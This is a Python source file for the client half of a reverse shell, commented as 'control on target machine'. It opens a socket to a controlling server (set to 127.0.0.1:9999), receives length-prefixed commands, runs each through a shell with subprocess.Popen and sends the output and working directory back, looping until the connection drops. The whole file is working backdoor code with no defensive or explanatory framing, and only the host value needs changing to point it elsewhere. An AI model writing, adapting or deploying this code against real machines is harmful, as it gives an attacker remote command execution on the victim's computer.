import socket
import os
import subprocess
# control on target machine


class Client:
    def __init__(self):
        self.clientSock = socket.socket()
        self.host = '127.0.0.1'  # 127.0.0.1
        self.port = 9999
        self.clientSock.connect((self.host, self.port))
        self.ClientLoop()

    def set_format(self, data):
        i = str(len(data.encode()))# string of the len of the binary v of data
        if(int(i) > 9999):
            return "### special code ###"
        i = i.zfill(14)
        print(len(str(i).encode()))
        return i + data
# need to encode the return

    def ClientLoop(self):
        output_str = ""
        while True:
            try:
                try:
                    dataLen = int((self.clientSock.recv(14)).decode())
                    data = self.clientSock.recv(dataLen)
                except:
                    continue
                if data.decode("utf-8") == 'cd':
                    self.clientSock.send(str.encode(self.set_format(str(os.getcwd()))))
                    continue
                if (len(data) > 0):
                    cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # opening a process. mwanging the I/O
                    output_bytes = cmd.stdout.read() + cmd.stderr.read() # the errors and outputs
                    output_str = str(output_bytes, "utf-8")
                    self.clientSock.send(str.encode(self.set_format(output_str + str(os.getcwd()) + '.')))
                    print(output_str)
            except socket.error as msg:
                print("Oh boy")
                print(output_str)
                self.clientSock.close()
                print(msg)
                break
            except:
                print("Come on")
                self.clientSock.send(str.encode(self.set_format("Eror Occured")))

def main():
    client = Client()

    return 0


if __name__ == '__main__':
    main()


